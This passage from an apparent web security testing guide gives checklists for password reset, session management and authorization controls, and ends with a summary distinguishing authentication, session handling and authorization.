- Is the password reset token random?
- Does the password reset token expire?
- Is the password reset token single-use?
- Is the password reset token linked to the user on the server side?
- Does the application prevent changing another user’s password by modifying an identifier?
- Are passwords hashed with a secure algorithm?
- Does the application avoid storing passwords in plaintext or reversible form?
- Do critical operations require re-authentication?
- Are successful and failed login attempts logged?
- Have default accounts and passwords been removed or changed?

---

# 12. Checklist: session management

- Does the application use a trusted session mechanism provided by the framework?
- Is the session identifier regenerated after login?
- Is the session identifier regenerated after a privilege level change?
- Is the application resistant to Session Fixation?
- Does the session cookie have the `HttpOnly` flag?
- Does the session cookie have the `Secure` flag?
- Does the session cookie have appropriate `SameSite`?
- Is the session identifier not sent in the URL?
- Does the session identifier not appear in HTML or API responses?
- Does the session identifier have proper length and entropy?
- Does the session expire after inactivity?
- Does the session have a maximum lifetime?
- Does logout invalidate the session on the server side?
- Does the old cookie stop working after logout?
- Does the application consciously handle parallel sessions?
- Can the user see active sessions?
- Does the “remember me” feature avoid storing username and password?
- Is the “remember me” token rotated and invalidated?
- Does the “remember me” token have a reasonable lifetime?

---

# 13. Checklist: authorization

- Does the application have a central authorization mechanism?
- Does every endpoint check permissions on the server side?
- Is hiding a function in the interface not the only protection?
- Can a regular user not access administrator functions?
- Can user A not read user B’s resources?
- Does changing `id` in the URL not give access to someone else’s data?
- Does changing `user_id`, `account_id`, `organization_id` not bypass control?
- Are UUIDs not treated as a replacement for authorization?
- Can the user not change their own role through a parameter?
- Does the application avoid trusting cookies such as `isAdmin=true`?
- Do data exports check permissions?
- Do file downloads check the resource owner?
- Do old endpoints have the same controls as new ones?
- Do web and mobile APIs have consistent authorization rules?
- Do critical operations require additional authorization?
- Are administrator operations logged?
- Are failed access attempts logged?
- Are user permissions reviewed periodically?
- Is the principle of least privilege applied?

---

# 14. Summary

Authentication, session management, and authorization are the foundation of access control in a web application.

But each of these mechanisms is responsible for something different.

Authentication answers the question:

> Who are you?

Session management answers the question:

> How does the application remember that you are already authenticated?

Authorization answers the question:

> What are you allowed to do?

The biggest problems begin when these concepts are mixed together.

An application may authenticate the user correctly but manage the session incorrectly.

It may manage the session correctly but fail to check authorization.

It may have two-factor authentication but allow another user’s password to be reset by changing `user_id`.

It may use UUIDs but still return someone else’s data.

It may hide the administrator panel, but the endpoint still works for a regular user.

That is why, during tests, it is not enough to check whether the login form works.

You have to check the entire trust cycle:

1. how the user confirms their identity,
2. how the application maintains their state,
3. how it makes access decisions,
4. where the user can influence those decisions,
5. whether the backend actually enforces security rules.

Good access control is not about the application “having login.”

Good access control means that every protected action and every protected resource is checked consciously, consistently, and on the server side.
